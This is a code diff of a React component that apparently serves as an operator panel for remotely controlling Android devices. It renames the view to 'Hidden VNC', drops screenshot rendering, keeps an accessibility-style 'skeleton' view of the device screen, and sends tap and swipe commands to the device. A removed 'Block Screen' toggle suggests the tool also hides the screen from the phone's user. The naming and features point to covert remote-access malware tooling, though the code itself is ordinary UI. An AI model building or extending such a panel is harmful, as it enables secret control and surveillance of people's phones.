-    console.log(`👆 [FullControl] Click detected:`, {
+    console.log(`👆 [HiddenVNC] Click detected:`, {
       at: `(${x}, ${y})`,
       duration,
     });
@@ -1005,16 +801,12 @@ export default function FullControl({ device, showContent = true, onViewSelect, 
 
   // Handle canvas touch/mouse start
   const handleCanvasStart = useCallback((clientX: number, clientY: number) => {
-    if (!canvasRef.current || !isConnected) return;
-    
-    // Allow swipe detection when either screenImageData or skeletonData is available
-    if (!screenImageData && !skeletonData) return;
+    if (!canvasRef.current || !isConnected || !skeletonData) return;
     
     const canvas = canvasRef.current;
     const rect = canvas.getBoundingClientRect();
     
     // Account for CSS scaling - convert CSS display coordinates to canvas pixel coordinates
-    // This is critical when canvas is displayed at a different size than its resolution
     const scaleX = canvas.width / rect.width;
     const scaleY = canvas.height / rect.height;
     
@@ -1030,7 +822,7 @@ export default function FullControl({ device, showContent = true, onViewSelect, 
     };
     isSwipeActiveRef.current = true;
     
-    console.log("👆 [FullControl] Swipe start:", { 
+    console.log("👆 [HiddenVNC] Swipe start:", { 
       canvasX, 
       canvasY, 
       clientX, 
@@ -1042,18 +834,11 @@ export default function FullControl({ device, showContent = true, onViewSelect, 
       scaleX,
       scaleY
     });
-  }, [isConnected, skeletonData, screenImageData]);
+  }, [isConnected, skeletonData]);
 
   // Handle canvas touch/mouse end (complete swipe)
   const handleCanvasEnd = useCallback((clientX: number, clientY: number) => {
-    if (!canvasRef.current || !isConnected || !swipeStartRef.current) {
-      isSwipeActiveRef.current = false;
-      swipeStartRef.current = null;
-      return;
-    }
-    
-    // Allow swipe detection when either screenImageData or skeletonData is available
-    if (!screenImageData && !skeletonData) {
+    if (!canvasRef.current || !isConnected || !skeletonData || !swipeStartRef.current) {
       isSwipeActiveRef.current = false;
       swipeStartRef.current = null;
       return;
@@ -1103,7 +888,7 @@ export default function FullControl({ device, showContent = true, onViewSelect, 
     // Determine if it's a click (small movement) or swipe (larger movement)
     const CLICK_THRESHOLD = 10; // pixels
     
-    console.log("👆 [FullControl] Swipe end:", {
+    console.log("👆 [HiddenVNC] Swipe end:", {
       canvasStart: { x: start.x, y: start.y },
       canvasEnd: { x: validEndCanvasX, y: validEndCanvasY },
       deviceStart: finalDeviceStart,
@@ -1114,7 +899,7 @@ export default function FullControl({ device, showContent = true, onViewSelect, 
     
     if (distance <= CLICK_THRESHOLD) {
       // It's a click/tap
-      console.log("👆 [FullControl] Detected as click");
+      console.log("👆 [HiddenVNC] Detected as click");
       sendDeviceCommand("access-command", {
         param: `click|${finalDeviceStart.x}|${finalDeviceStart.y}`,
       });
@@ -1129,7 +914,7 @@ export default function FullControl({ device, showContent = true, onViewSelect, 
       // It's a swipe
       const swipeDuration = Math.max(100, Math.min(duration, 1000)); // Clamp between 100ms and 1000ms
       
-      console.log("👆 [FullControl] Detected as swipe");
+      console.log("👆 [HiddenVNC] Detected as swipe");
       sendDeviceCommand("access-command", {
         param: `swipe|${finalDeviceStart.x}|${finalDeviceStart.y}|${finalDeviceEnd.x}|${finalDeviceEnd.y}|${swipeDuration}`,
       });
@@ -1147,7 +932,7 @@ export default function FullControl({ device, showContent = true, onViewSelect, 
     // Reset swipe tracking
     isSwipeActiveRef.current = false;
     swipeStartRef.current = null;
-  }, [isConnected, skeletonData, screenImageData, canvasToDeviceCoords, emitSwipeDetected, emitClickDetected, sendDeviceCommand]);
+  }, [isConnected, skeletonData, canvasToDeviceCoords, emitSwipeDetected, emitClickDetected, sendDeviceCommand]);
 
   // Mouse event handlers
   const handleCanvasMouseDown = useCallback((e: React.MouseEvent<HTMLCanvasElement>) => {
@@ -1186,433 +971,13 @@ export default function FullControl({ device, showContent = true, onViewSelect, 
     }
   }, [handleCanvasEnd]);
 
-  // Render screen image on canvas - Anti-flicker optimized
+  // Render skeleton on canvas
   useEffect(() => {
-    console.log("🖼️ [FullControl] Render effect triggered:", {
-      hasScreenImageData: !!screenImageData,
-      hasCanvas: !!canvasRef.current,
-      isConnected,
-      hasDimensions: !!screenImageDimensions,
-      dimensions: screenImageDimensions
-    });
-
-    if (!screenImageData || !canvasRef.current || !isConnected || !screenImageDimensions) {
-      console.log("⏸️ [FullControl] Skipping render - missing requirements");
+    if (!skeletonData || !canvasRef.current || !containerRef.current || !isConnected) {
       return;
     }
 
-    const canvas = canvasRef.current;
-    if (!canvas) {
-      console.error("❌ [FullControl] Canvas ref is null");
-      return;
-    }
-
-    console.log("🖼️ [FullControl] Canvas found, starting render process");
-
-    // Get device dimensions from screen image - use EXACT device resolution
-    const deviceWidth = screenImageDimensions.width || 720;
-    const deviceHeight = screenImageDimensions.height || 1232;
-    
-    // Use EXACT device resolution for canvas
-    const canvasWidth = deviceWidth;
-    const canvasHeight = deviceHeight;
-    
-    // Calculate display scale to fit within phoneWidth container
-    const maxDisplayWidth = phoneWidth - 12;
-    const displayScale = Math.min(1, maxDisplayWidth / deviceWidth);
-    const displayWidth = deviceWidth * displayScale;
-    const displayHeight = deviceHeight * displayScale;
-    
-    // Store screen height for container div (display size)
-    setScreenHeight(displayHeight);
-    
-    // Set canvas dimensions to EXACT device resolution
-    canvas.width = canvasWidth;
-    canvas.height = canvasHeight;
-    // Set CSS size for display (scaled down if needed to fit container)
-    canvas.style.width = `${displayWidth}px`;
-    canvas.style.height = `${displayHeight}px`;
-
-    // Pre-calculate UI dimensions
-    const statusBarHeight = Math.round(canvasHeight * 0.04);
-    const navBarHeight = Math.round(canvasHeight * 0.06);
-    const screenStartY = statusBarHeight;
-    const screenHeight = canvasHeight - statusBarHeight - navBarHeight;
-    
-    // Draw function - reusable for both previous and new image
-    const drawImageToCanvas = (img: HTMLImageElement, currentCtx: CanvasRenderingContext2D) => {
-      console.log("🎨 [FullControl] drawImageToCanvas called:", {
-        imgWidth: img.width,
-        imgHeight: img.height,
-        imgComplete: img.complete,
-        canvasWidth,
-        canvasHeight,
-        screenHeight,
-        screenStartY
-      });
-      
-      // Canvas is now EXACT device resolution, so draw image at 1:1 pixel mapping
-      // Image should match canvas dimensions exactly
-      // Status bar and nav bar will be drawn on top of the image
-      const scaleX = 1; // 1:1 pixel mapping
-      const scaleY = 1; // 1:1 pixel mapping
-      
-      // Draw image at exact device resolution (1:1 pixel mapping)
-      const scaledWidth = canvasWidth; // Same as device width
-      const scaledHeight = canvasHeight; // Same as device height
-      const x = 0; // Start at left edge
-      const y = 0; // Start at top of canvas (status bar will be drawn on top)
-      
-      console.log("🎨 [FullControl] Image drawing params:", {
-        scaleX,
-        scaleY,
-        scaledWidth,
-        scaledHeight,
-        x,
-        y,
-        imgWidth: img.width,
-        imgHeight: img.height,
-        canvasWidth,
-        screenHeight
-      });
-      
-      // Draw image
-      try {
-        currentCtx.drawImage(img, x, y, scaledWidth, scaledHeight);
-        console.log("✅ [FullControl] Image drawn to canvas successfully");
-      } catch (error) {
-        console.error("❌ [FullControl] Error in drawImage:", error);
-        throw error;
-      }
-    };
-    
-    const drawUIChrome = (currentCtx: CanvasRenderingContext2D) => {
-      // Draw Android status bar area (top)
-      const statusGradient = currentCtx.createLinearGradient(0, 0, 0, statusBarHeight);
-      statusGradient.addColorStop(0, "#1a1a1a");
-      statusGradient.addColorStop(1, "#0a0a0a");
-      currentCtx.fillStyle = statusGradient;
-      currentCtx.fillRect(0, 0, canvasWidth, statusBarHeight);
-      
-      // Draw status bar content
-      currentCtx.fillStyle = "#e5e5e5";
-      currentCtx.font = `bold ${Math.round(statusBarHeight * 0.5)}px -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif`;
-      currentCtx.textAlign = "left";
-      currentCtx.textBaseline = "middle";
-      currentCtx.fillText("9:41", 16, statusBarHeight / 2);
-      
-      // Battery icon
-      const batteryWidth = 24;
-      const batteryHeight = 12;
-      const batteryX = canvasWidth - batteryWidth - 16;
-      const batteryY = (statusBarHeight - batteryHeight) / 2;
-      
-      currentCtx.strokeStyle = "#e5e5e5";
-      currentCtx.lineWidth = 1.5;
-      currentCtx.strokeRect(batteryX, batteryY, batteryWidth, batteryHeight);
-      currentCtx.fillStyle = "#e5e5e5";
-      currentCtx.fillRect(batteryX + batteryWidth, batteryY + 3, 2, batteryHeight - 6);
-      
-      const batteryGradient = currentCtx.createLinearGradient(batteryX, 0, batteryX + batteryWidth, 0);
-      batteryGradient.addColorStop(0, "#4ade80");
-      batteryGradient.addColorStop(1, "#22c55e");
-      currentCtx.fillStyle = batteryGradient;
-      currentCtx.fillRect(batteryX + 2, batteryY + 2, batteryWidth * 0.7, batteryHeight - 4);
-      
-      // Signal bars
-      const signalX = batteryX - 40;
-      for (let i = 0; i < 4; i++) {
-        const barHeight = 3 + (i * 2);
-        const barX = signalX + (i * 5);
-        const barY = statusBarHeight / 2 + (12 - barHeight) / 2;
-        currentCtx.fillStyle = i < 3 ? "#e5e5e5" : "#4ade80";
-        currentCtx.fillRect(barX, barY, 3, barHeight);
-      }
-      
-      // Draw Android navigation bar area (bottom)
-      const navBarY = canvasHeight - navBarHeight;
-      const navGradient = currentCtx.createLinearGradient(0, navBarY, 0, canvasHeight);
-      navGradient.addColorStop(0, "#0a0a0a");
-      navGradient.addColorStop(1, "#1a1a1a");
-      currentCtx.fillStyle = navGradient;
-      currentCtx.fillRect(0, navBarY, canvasWidth, navBarHeight);
-      
-      // Draw navigation gesture bar
-      const gestureBarWidth = 120;
-      const gestureBarHeight = 4;
-      const gestureBarX = (canvasWidth - gestureBarWidth) / 2;
-      const gestureBarY = navBarY + (navBarHeight - gestureBarHeight) / 2;
-      
-      currentCtx.fillStyle = "#6b7280";
-      currentCtx.beginPath();
-      if (currentCtx.roundRect) {
-        currentCtx.roundRect(gestureBarX, gestureBarY, gestureBarWidth, gestureBarHeight, 2);
-      } else {
-        currentCtx.fillRect(gestureBarX, gestureBarY, gestureBarWidth, gestureBarHeight);
-      }
-      currentCtx.fill();
-    };
-    
-    // Draw function that ensures canvas is ready
-    const renderImage = (img: HTMLImageElement) => {
-      if (!canvas) {
-        console.error("❌ [FullControl] Canvas is null in renderImage");
-        return;
-      }
-      
-      if (!img.complete || img.width === 0 || img.height === 0) {
-        console.warn("⚠️ [FullControl] Image not ready:", {
-          complete: img.complete,
-          width: img.width,
-          height: img.height
-        });
-        return;
-      }
-      
-      console.log("🎨 [FullControl] Rendering image:", {
-        imageSize: { width: img.width, height: img.height },
-        canvasSize: { width: canvasWidth, height: canvasHeight }
-      });
-      
-      const currentCtx = canvas.getContext("2d");
-      if (!currentCtx) {
-        console.error("❌ [FullControl] Failed to get context");
-        return;
-      }
-      
-      // Ensure canvas dimensions are set
-      if (canvas.width !== canvasWidth || canvas.height !== canvasHeight) {
-        console.log("📐 [FullControl] Setting canvas dimensions:", { canvasWidth, canvasHeight });
-        canvas.width = canvasWidth;
-        canvas.height = canvasHeight;
-        canvas.style.width = `${canvasWidth}px`;
-        canvas.style.height = `${canvasHeight}px`;
-      }
-      
-      // Clear entire canvas first
-      currentCtx.clearRect(0, 0, canvasWidth, canvasHeight);
-      
-      // Fill background with dark color (will be covered by image)
-      currentCtx.fillStyle = "#000000";
-      currentCtx.fillRect(0, 0, canvasWidth, canvasHeight);
-      
-      // Draw the screen image
-      try {
-        // Verify image is ready before drawing
-        if (!img.complete) {
-          console.warn("⚠️ [FullControl] Image not complete when trying to draw");
-          currentCtx.fillStyle = "#ffff00";
-          currentCtx.font = "16px Arial";
-          currentCtx.fillText("Image not ready", 10, 30);
-          return;
-        }
-        
-        if (img.width === 0 || img.height === 0) {
-          console.warn("⚠️ [FullControl] Image has zero dimensions");
-          currentCtx.fillStyle = "#ff8800";
-          currentCtx.font = "16px Arial";
-          currentCtx.fillText("Image has zero size", 10, 30);
-          return;
-        }
-        
-        drawImageToCanvas(img, currentCtx);
-        console.log("✅ [FullControl] Image drawn successfully");
-      } catch (error) {
-        console.error("❌ [FullControl] Error drawing image:", error);
-        // Draw error message on canvas
-        currentCtx.fillStyle = "#ff0000";
-        currentCtx.font = "16px Arial";
-        currentCtx.fillText("Error drawing image", 10, 30);
-        currentCtx.fillText(String(error), 10, 50);
-      }
-      
-      // Draw UI chrome on top
-      drawUIChrome(currentCtx);
-      
-      previousImageRef.current = img;
-      setIsLoading(false);
-      
-      console.log("✅ [FullControl] Image rendered successfully");
-    };
-    
-    // Check if we have a cached image
-    const cachedImg = imageCacheRef.current.get(screenImageData);
-    if (cachedImg && cachedImg.complete && cachedImg.width > 0) {
-      // Image is already loaded - draw immediately (no flicker)
-      requestAnimationFrame(() => renderImage(cachedImg));
-      return;
-    }
-    
-    // Draw previous image while loading new one (prevent flicker)
-    if (previousImageRef.current && previousImageRef.current.complete && previousImageRef.current.width > 0) {
-      requestAnimationFrame(() => renderImage(previousImageRef.current!));
-    }
-    
-    // Create new image from base64 data
-    const img = new Image();
-    
-    img.onload = () => {
-      console.log("✅ [FullControl] Image loaded successfully:", {
-        width: img.width,
-        height: img.height,
-        naturalWidth: img.naturalWidth,
-        naturalHeight: img.naturalHeight,
-        complete: img.complete,
-        src: img.src.substring(0, 50) + '...'
-      });
-      
-      if (img.width === 0 || img.height === 0) {
-        console.error("❌ [FullControl] Image loaded but has zero dimensions");
-        setIsLoading(false);
-        return;
-      }
-      
-      // Cache the loaded image
-      imageCacheRef.current.set(screenImageData, img);
-      
-      // Limit cache size to prevent memory issues
-      if (imageCacheRef.current.size > 3) {
-        const firstKey = imageCacheRef.current.keys().next().value;
-        if (firstKey !== undefined) {
-          imageCacheRef.current.delete(firstKey);
-        }
-      }
-      
-      // Draw new image immediately
-      requestAnimationFrame(() => {
-        console.log("🎨 [FullControl] Drawing loaded image");
-        renderImage(img);
-      });
-    };
-    
-    img.onerror = (error) => {
-      console.error("❌ [FullControl] Error loading image:", error);
-      console.error("❌ [FullControl] Error event:", error);
-      console.error("❌ [FullControl] Image src preview:", screenImageData.substring(0, 100));
-      console.error("❌ [FullControl] Full image src (first 200 chars):", screenImageData.substring(0, 200));
-      console.error("❌ [FullControl] Image src length:", screenImageData.length);
-      console.error("❌ [FullControl] Image src starts with data:", screenImageData.startsWith('data:'));
-      
-      // Try to validate base64
-      const base64Part = screenImageData.includes(',') ? screenImageData.split(',')[1] : screenImageData;
-      const isValidBase64 = /^[A-Za-z0-9+/=]+$/.test(base64Part);
-      console.error("❌ [FullControl] Base64 validation:", {
-        hasComma: screenImageData.includes(','),
-        base64PartLength: base64Part?.length,
-        isValidBase64,
-        base64Preview: base64Part?.substring(0, 50),
-        firstChars: base64Part?.substring(0, 10),
-        lastChars: base64Part?.substring(base64Part.length - 10)
-      });
-      
-      // Check data URI format
-      if (screenImageData.startsWith('data:')) {
-        const [header, data] = screenImageData.split(',');
-        console.error("❌ [FullControl] Data URI header:", header);
-        console.error("❌ [FullControl] Data URI data length:", data?.length);
-        console.error("❌ [FullControl] Data URI data preview:", data?.substring(0, 20));
-      }
-      
-      // Try to test with a simple test image
-      console.log("🧪 [FullControl] Testing with a simple 1x1 pixel image...");
-      const testImg = new Image();
-      testImg.onload = () => console.log("✅ [FullControl] Test image loaded successfully");
-      testImg.onerror = () => console.error("❌ [FullControl] Even test image failed - browser issue");
-      testImg.src = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==';
-      
-      // Draw error indicator on canvas
-      if (canvas) {
-        const ctx = canvas.getContext("2d");
-        if (ctx) {
-          ctx.fillStyle = "#ff0000";
-          ctx.font = "20px Arial";
-          ctx.fillText("Image Load Error", 20, 50);
-          ctx.fillText("Check console", 20, 80);
-          ctx.fillText(`Length: ${screenImageData.length}`, 20, 110);
-          ctx.fillText(`Has data: ${screenImageData.startsWith('data:')}`, 20, 140);
-        }
-      }
-      
-      setIsLoading(false);
-    };
-    
-    // Start loading immediately
-    console.log("🖼️ [FullControl] Setting image src, length:", screenImageData.length);
-    console.log("🖼️ [FullControl] Image src preview:", screenImageData.substring(0, 100));
-    console.log("🖼️ [FullControl] Image src starts with data:", screenImageData.startsWith('data:'));
-    console.log("🖼️ [FullControl] Image src format check:", {
-      isWebP: screenImageData.includes('data:image/webp'),
-      isJPEG: screenImageData.includes('data:image/jpeg'),
-      isPNG: screenImageData.includes('data:image/png')
-    });
-    
-    // Validate data URI format before setting src
-    if (!screenImageData.startsWith('data:')) {
-      console.warn("⚠️ [FullControl] Image data doesn't start with 'data:' prefix - this will cause an error!");
-      console.warn("⚠️ [FullControl] Attempting to fix by adding data URI prefix...");
-      // Try to fix it - detect format from first chars
-      let detectedMime = 'image/jpeg'; // default
-      if (screenImageData.startsWith('/9j/')) {
-        detectedMime = 'image/jpeg';
-      } else if (screenImageData.startsWith('iVBORw0KGgo')) {
-        detectedMime = 'image/png';
-      } else if (screenImageData.startsWith('UklGR')) {
-        detectedMime = 'image/webp';
-      }
-      let fixedData = `data:${detectedMime};base64,${screenImageData}`;
-      // CRITICAL: Fix missing leading slash for JPEG before rendering
-      if (fixedData.includes('base64,9j/') && !fixedData.includes('base64,/9j/')) {
-        fixedData = fixedData.replace('base64,9j/', 'base64,/9j/');
-        console.log("🔧 [FullControl] Fixed missing slash in data URI before rendering");
-      }
-      console.log("🔧 [FullControl] Fixed data URI:", fixedData.substring(0, 50));
-      img.src = fixedData;
-    } else {
-      // Validate the data URI format
-      const parts = screenImageData.split(',');
-      if (parts.length !== 2) {
-        console.error("❌ [FullControl] Invalid data URI format - should have exactly one comma");
-        console.error("❌ [FullControl] Parts count:", parts.length);
-        setIsLoading(false);
-        return;
-      }
-      
-      const [header, data] = parts;
-      if (!header.includes('base64')) {
-        console.error("❌ [FullControl] Data URI header doesn't contain 'base64'");
-        console.error("❌ [FullControl] Header:", header);
-        setIsLoading(false);
-        return;
-      }
-      
-      if (!data || data.length === 0) {
-        console.error("❌ [FullControl] Data URI has no data after comma");
-        setIsLoading(false);
-        return;
-      }
-      
-      // CRITICAL: Fix missing leading slash for JPEG before rendering
-      let finalImageData = screenImageData;
-      if (finalImageData.includes('base64,9j/') && !finalImageData.includes('base64,/9j/')) {
-        finalImageData = finalImageData.replace('base64,9j/', 'base64,/9j/');
-        console.log("🔧 [FullControl] Fixed missing slash in data URI before rendering");
-        console.log("🔧 [FullControl] Fixed preview:", finalImageData.substring(0, 50));
-      }
-      
-      console.log("✅ [FullControl] Data URI format is valid, setting src");
-      img.src = finalImageData;
-    }
-    
-  }, [screenImageData, screenImageDimensions, isConnected, phoneWidth]);
-
-  // Render skeleton on canvas (fallback when no screen image)
-  useEffect(() => {
-    if (!skeletonData || !canvasRef.current || !containerRef.current || !isConnected || screenImageData) {
-      // Skip skeleton rendering if screen image is available
-      return;
-    }
-
-    console.log("🎨 [FullControl] Starting render with skeleton data:", {
+    console.log("🎨 [HiddenVNC] Starting render with skeleton data:", {
       package: skeletonData.package,
       device_width: skeletonData.device_width,
       device_height: skeletonData.device_height,
@@ -1623,7 +988,7 @@ export default function FullControl({ device, showContent = true, onViewSelect, 
     const canvas = canvasRef.current;
     const ctx = canvas.getContext("2d");
     if (!ctx) {
-      console.error("❌ [FullControl] Failed to get canvas context");
+      console.error("❌ [HiddenVNC] Failed to get canvas context");
       return;
     }
 
@@ -1631,7 +996,7 @@ export default function FullControl({ device, showContent = true, onViewSelect, 
     
     // Wait for container to have dimensions
     if (container.clientWidth === 0 || container.clientHeight === 0) {
-      console.log("⏸️ [FullControl] Container has no dimensions, waiting...");
+      console.log("⏸️ [HiddenVNC] Container has no dimensions, waiting...");
       // Retry after a short delay
       const timeout = setTimeout(() => {
         if (skeletonData && canvasRef.current && containerRef.current) {
@@ -1660,7 +1025,7 @@ export default function FullControl({ device, showContent = true, onViewSelect, 
     const containerWidth = maxContainerWidth;
     const containerHeight = maxContainerHeight;
 
-    console.log("📐 [FullControl] Container dimensions:", {
+    console.log("📐 [HiddenVNC] Container dimensions:", {
       containerWidth,
       containerHeight,
       deviceWidth,
@@ -1692,7 +1057,7 @@ export default function FullControl({ device, showContent = true, onViewSelect, 
     // Use the smaller scale to ensure nothing gets cut off
     const uniformScale = Math.min(scaleX, scaleY);
 
-    console.log("📐 [FullControl] Canvas dimensions:", {
+    console.log("📐 [HiddenVNC] Canvas dimensions:", {
       canvasWidth,
       canvasHeight,
       scaleX,
@@ -1776,8 +1141,8 @@ export default function FullControl({ device, showContent = true, onViewSelect, 
 
     // Draw skeleton views (offset by status bar)
     if (Array.isArray(skeletonData.skeleton) && skeletonData.skeleton.length > 0) {
-      console.log(`🎨 [FullControl] Drawing ${skeletonData.skeleton.length} skeleton entries`);
-      console.log(`🎨 [FullControl] Screen area:`, {
+      console.log(`🎨 [HiddenVNC] Drawing ${skeletonData.skeleton.length} skeleton entries`);
+      console.log(`🎨 [HiddenVNC] Screen area:`, {
         screenStartY,
         screenHeight,
         canvasWidth,
@@ -1804,7 +1169,7 @@ export default function FullControl({ device, showContent = true, onViewSelect, 
         // Skip if dimensions are invalid or out of bounds
         if (clampedWidth <= 0 || clampedHeight <= 0) {
           if (index < 5) {
-            console.log(`⏭️ [FullControl] Skipping entry ${index} - invalid or out of bounds:`, {
+            console.log(`⏭️ [HiddenVNC] Skipping entry ${index} - invalid or out of bounds:`, {
               original: { x, y, width, height },
               clamped: { x: clampedX, y: clampedY, width: clampedWidth, height: clampedHeight }
             });
@@ -1813,7 +1178,7 @@ export default function FullControl({ device, showContent = true, onViewSelect, 
         }
         
         if (index < 5) {
-          console.log(`🎨 [FullControl] Drawing entry ${index}:`, {
+          console.log(`🎨 [HiddenVNC] Drawing entry ${index}:`, {
             type: entry.type,
             text: entry.text?.substring(0, 20),
             original: { x: entry.x, y: entry.y, width: entry.width, height: entry.height },
@@ -1871,9 +1236,9 @@ export default function FullControl({ device, showContent = true, onViewSelect, 
         }
       });
       
-      console.log(`✅ [FullControl] Successfully drew ${drawnCount} out of ${skeletonData.skeleton.length} skeleton entries`);
+      console.log(`✅ [HiddenVNC] Successfully drew ${drawnCount} out of ${skeletonData.skeleton.length} skeleton entries`);
     } else {
-      console.warn("⚠️ [FullControl] No skeleton entries to draw:", {
+      console.warn("⚠️ [HiddenVNC] No skeleton entries to draw:", {
         skeleton: skeletonData.skeleton,
         length: Array.isArray(skeletonData.skeleton) ? skeletonData.skeleton.length : "N/A",
         type: typeof skeletonData.skeleton
@@ -1937,8 +1302,8 @@ export default function FullControl({ device, showContent = true, onViewSelect, 
           {isMinimized ? (
             <div className="p-2 bg-muted/30 rounded flex items-center justify-between gap-2">
               <div className="flex items-center gap-2">
-                <Monitor className="h-4 w-4" />
-                <span className="text-xs font-semibold">Full Control - {device.name}</span>
+                <EyeOff className="h-4 w-4" />
+                <span className="text-xs font-semibold">Hidden VNC - {device.name}</span>
               </div>
               <div className="flex items-center gap-1">
                 <Button
@@ -1982,12 +1347,12 @@ export default function FullControl({ device, showContent = true, onViewSelect, 
               {/* Screen Display - Compact */}
               {!isConnected ? (
                 <div className="w-full mx-auto aspect-[9/19.5] bg-gradient-to-br from-muted/50 to-muted rounded-xl flex items-center justify-center border-2 border-dashed border-primary/20 relative overflow-hidden" style={{ maxWidth: `${phoneWidth}px` }}>
-                  <div className="absolute inset-0 bg-gradient-to-tr from-blue-500/5 via-purple-500/5 to-pink-500/5 animate-pulse" />
+                  <div className="absolute inset-0 bg-gradient-to-tr from-purple-500/5 via-pink-500/5 to-purple-500/5 animate-pulse" />
                   
                   <div className="relative text-center text-muted-foreground space-y-3 px-4">
                     <div className="relative inline-block">
                       <div className="absolute inset-0 bg-primary/20 rounded-full blur-xl animate-pulse" />
-                      <Monitor className="relative h-12 w-12 mx-auto text-primary/60" />
+                      <EyeOff className="relative h-12 w-12 mx-auto text-primary/60" />
                     </div>
                     <div className="space-y-1">
                       <p className="text-sm font-semibold">Ready to Connect</p>
@@ -2010,7 +1375,7 @@ export default function FullControl({ device, showContent = true, onViewSelect, 
                         className="px-2 py-1 text-center cursor-move"
                         onMouseDown={handleMouseDown}
                       >
-                        <h2 className="text-sm font-bold">Full Control - {device.name}</h2>
+                        <h2 className="text-sm font-bold">Hidden VNC - {device.name}</h2>
                       </div>
                       
                       {/* Simple Rectangle Display - Just thin border */}
@@ -2021,28 +1386,12 @@ export default function FullControl({ device, showContent = true, onViewSelect, 
                           height: screenHeight ? `${screenHeight}px` : "600px",
                         }}
                       >
-                      {isLoading && !screenImageData && !skeletonData ? (
+                      {isLoading && !skeletonData ? (
                         <div className="absolute inset-0 flex flex-col items-center justify-center bg-black text-gray-300">
                           <Loader2 className="h-12 w-12 mb-4 animate-spin opacity-50" />
-                          <p className="text-sm">Loading screen data...</p>
+                          <p className="text-sm">Loading skeleton data...</p>
                           <p className="text-xs mt-2 text-gray-400">Waiting for data from device...</p>
                         </div>
-                      ) : screenImageData ? (
-                        <canvas
-                          ref={canvasRef}
-                          className="block w-full h-full cursor-pointer touch-none select-none"
-                          style={{
-                            display: "block",
-                            width: "100%",
-                            height: "100%",
-                            backgroundColor: "#000000",
-                          }}
-                          onMouseDown={handleCanvasMouseDown}
-                          onMouseUp={handleCanvasMouseUp}
-                          onMouseLeave={handleCanvasMouseUp}
-                          onTouchStart={handleCanvasTouchStart}
-                          onTouchEnd={handleCanvasTouchEnd}
-                        />
                       ) : skeletonData && Array.isArray(skeletonData.skeleton) && skeletonData.skeleton.length > 0 ? (
                         <canvas
                           ref={canvasRef}
@@ -2061,8 +1410,8 @@ export default function FullControl({ device, showContent = true, onViewSelect, 
                         />
                       ) : (
                         <div className="absolute inset-0 flex flex-col items-center justify-center bg-black text-gray-300">
-                          <Monitor className="h-12 w-12 mb-4 opacity-50" />
-                          <p className="text-sm">Waiting for screen data...</p>
+                          <EyeOff className="h-12 w-12 mb-4 opacity-50" />
+                          <p className="text-sm">Waiting for skeleton data...</p>
                           {skeletonData && (
                             <p className="text-xs mt-2 text-red-400">
                               Data received but skeleton is {Array.isArray(skeletonData.skeleton) ? `empty (${skeletonData.skeleton.length} items)` : `not an array (${typeof skeletonData.skeleton})`}
@@ -2131,8 +1480,6 @@ export default function FullControl({ device, showContent = true, onViewSelect, 
                           setIsPopupOpen(false);
                           setIsConnected(false);
                           setSkeletonData(null);
-                          setScreenImageData(null);
-                          setScreenImageDimensions(null);
                           if (onViewSelect) {
                             setTimeout(() => {
                               onViewSelect(null);
@@ -2205,7 +1552,7 @@ export default function FullControl({ device, showContent = true, onViewSelect, 
                             handleConnect();
                           }}
                           size="sm" 
-                          className="h-10 w-full p-0 bg-blue-600 hover:bg-blue-700 text-white"
+                          className="h-10 w-full p-0 bg-purple-600 hover:bg-purple-700 text-white"
                           title="Connect"
                         >
                           <Power className="h-4 w-4" />
@@ -2378,18 +1725,6 @@ export default function FullControl({ device, showContent = true, onViewSelect, 
                           {isLocked ? <Lock className="h-4 w-4" /> : <Unlock className="h-4 w-4" />}
                         </Button>
                         
-                        <div className="h-px w-full bg-border/50" />
-                        
-                        {/* Block Screen Toggle */}
-                        <div className="px-2 py-1.5 flex items-center justify-center gap-1.5">
-                          <Lock className="h-3 w-3 text-muted-foreground" />
-                          <Switch
-                            checked={blockScreenEnabled}
-                            onCheckedChange={handleBlockScreenToggle}
-                            className="scale-75"
-                          />
-                        </div>
-                        
                         </>
                       )}
                     </div>
@@ -2406,4 +1741,3 @@ export default function FullControl({ device, showContent = true, onViewSelect, 
     </>
   );
 }
-
